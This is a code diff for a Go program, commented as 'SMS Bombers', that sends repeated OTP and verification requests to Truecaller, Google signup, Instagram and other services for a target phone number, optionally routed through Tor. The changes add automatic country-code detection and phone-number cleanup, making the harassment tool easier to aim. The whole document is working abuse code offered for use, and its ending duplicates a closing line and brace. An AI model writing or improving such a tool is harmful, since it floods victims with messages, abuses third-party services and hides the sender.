@@ -8,9 +8,9 @@ import (
 	"math/rand"
 	"net/http"
 	"net/url"
+	"regexp"
 	"strings"
 	"time"
-
 	"golang.org/x/net/proxy"
 )
 
@@ -21,13 +21,43 @@ var userAgents = []string{
 	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
 }
 
+// countryCodes maps country phone prefixes to country codes
+var countryCodes = map[string]string{
+	"1":  "us",    // USA, Canada, etc.
+	"44": "gb",    // United Kingdom
+	"49": "de",    // Germany
+	"32": "be",    // Belgium
+	"98": "ir",    // Iran
+	"33": "fr",    // France
+	"34": "es",    // Spain
+	"39": "it",    // Italy
+	"7":  "ru",    // Russia
+	"90": "tr",    // Turkey
+	// ... add more if needed
+}
+
+// detectCountryCode tries to detect the country code from the phone number (with or without +)
+func detectCountryCode(phone string) (prefix, cc, local string) {
+	phone = strings.TrimSpace(phone)
+	phone = strings.TrimPrefix(phone, "+")
+	for plen := 3; plen >= 1; plen-- {
+		if len(phone) >= plen {
+			prefixTry := phone[:plen]
+			if cc, ok := countryCodes[prefixTry]; ok {
+				return prefixTry, cc, phone[plen:]
+			}
+		}
+	}
+	// fallback: return full, empty, full
+	return "", "", phone
+}
+
 // randomUserAgent returns a random user-agent string
 func randomUserAgent() string {
 	rand.Seed(time.Now().UnixNano())
 	return userAgents[rand.Intn(len(userAgents))]
 }
 
-// getTorClient tries to create an HTTP client through TOR SOCKS5 proxy
 func getTorClient() *http.Client {
 	socksProxy := "127.0.0.1:9050"
 	dialer, err := proxy.SOCKS5("tcp", socksProxy, nil, proxy.Direct)
@@ -39,12 +69,10 @@ func getTorClient() *http.Client {
 	return &http.Client{Transport: transport, Timeout: 12 * time.Second}
 }
 
-// getDirectClient returns a normal HTTP client
 func getDirectClient() *http.Client {
 	return &http.Client{Timeout: 12 * time.Second}
 }
 
-// sendJSON sends a POST JSON request via the provided client
 func sendJSON(client *http.Client, url string, payload map[string]interface{}) {
 	jsonData, _ := json.Marshal(payload)
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
@@ -63,7 +91,6 @@ func sendJSON(client *http.Client, url string, payload map[string]interface{}) {
 	fmt.Printf("Sent JSON to %s : %v\n", url, resp.Status)
 }
 
-// sendForm sends a POST Form request via the provided client
 func sendForm(client *http.Client, url string, form url.Values) {
 	req, err := http.NewRequest("POST", url, strings.NewReader(form.Encode()))
 	if err != nil {
@@ -81,7 +108,6 @@ func sendForm(client *http.Client, url string, form url.Values) {
 	fmt.Printf("Sent Form to %s : %v\n", url, resp.Status)
 }
 
-// sendGET sends a GET request via the provided client
 func sendGET(client *http.Client, url string) {
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
@@ -109,8 +135,14 @@ func checkTorIP(client *http.Client) string {
 	return buf.String()
 }
 
+// sanitizePhone returns only digits from input
+func sanitizePhone(phone string) string {
+	re := regexp.MustCompile(`\D`)
+	return re.ReplaceAllString(phone, "")
+}
+
 func main() {
-	var phone, countryCode, email string
+	var phoneInput, email string
 
 	fmt.Print("Use TOR? (y/n): ")
 	var useTor string
@@ -125,16 +157,26 @@ func main() {
 		fmt.Println("Your direct IP is:", checkTorIP(client))
 	}
 
-	fmt.Print("Enter phone number (e.g., 32484155542): ")
-	fmt.Scanln(&phone)
-	fmt.Print("Enter country code (e.g., be): ")
-	fmt.Scanln(&countryCode)
+	fmt.Print("Enter phone number with country code (e.g., +32484155542 or 989123456789): ")
+	fmt.Scanln(&phoneInput)
+	phone := sanitizePhone(phoneInput)
+	prefix, cc, local := detectCountryCode(phone)
+	if cc == "" {
+		// fallback ask user
+		fmt.Print("Could not detect country code. Please enter 2-letter country code (e.g., be): ")
+		fmt.Scanln(&cc)
+	}
+
+	// اگر local خالی بود یعنی شماره کامل بود
+	if local == "" {
+		local = phone
+	}
 
 	// SMS Bombers
 	sendJSON(client, "https://europe-west1-truecaller-web.cloudfunctions.net/webapi/eu/auth/truecaller/v1/send-otp",
 		map[string]interface{}{
-			"phone":       phone,
-			"countryCode": countryCode,
+			"phone":       local,
+			"countryCode": cc,
 		})
 
 	sendGET(client, "https://www.truecaller.com/cms/z1m1hpbqstj98vij_phone-number-verification-login.json")
@@ -156,7 +198,7 @@ func main() {
 			"rpcids":      {"rxubAb"},
 			"source-path": {"/lifecycle/steps/signup/startmtsmsidv"},
 			"hl":          {"en-US"},
-			"f.req":       {`[[["rxubAb","[[[\"` + phone + `\",\"` + countryCode + `\"],null,145,\"https://mail.google.com/mail/\",[\"https://mail.google.com/mail/\",\"mail\"]]]",null,"generic"]]]`},
+			"f.req":       {`[[["rxubAb","[[[\"` + local + `\",\"` + cc + `\"],null,145,\"https://mail.google.com/mail/\",[\"https://mail.google.com/mail/\",\"mail\"]]]",null,"generic"]]]`},
 		})
 
 	sendForm(client, "https://www.instagram.com/api/v1/web/accounts/check_phone_number/",
@@ -206,5 +248,7 @@ func main() {
 			"jazoest":   {"21771"},
 		})
 
+	fmt.Println("Done. Check the above responses.")
+}
 	fmt.Println("Done. Check the above responses.")
 }
